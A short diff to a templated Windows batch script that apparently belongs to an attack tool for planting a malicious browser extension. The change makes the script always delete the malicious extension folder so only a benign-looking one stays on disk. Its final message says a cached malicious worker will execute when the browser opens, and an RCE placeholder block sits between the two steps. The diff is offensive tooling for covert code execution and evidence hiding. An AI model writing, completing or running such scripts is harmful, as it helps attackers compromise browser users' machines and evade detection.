@@ -111,10 +111,8 @@ if errorlevel 1 (
 )
 
 REM Remove malicious folder A so only the benign folder remains on disk
-if /i not "{{MALICIOUS_NAME}}"=="{{BENIGN_NAME}}" (
-    echo [*] Removing malicious extension folder...
-    rmdir /S /Q "%BROWSER_TARGET_DIR%\{{MALICIOUS_NAME}}" 2>nul
-)
+echo [*] Removing malicious extension folder...
+rmdir /S /Q "%BROWSER_TARGET_DIR%\{{MALICIOUS_NAME}}" 2>nul
 
 {{RCE_BLOCK}}
 echo [+] Done. Launch {{BROWSER_NAME}} - the cached malicious worker will execute.
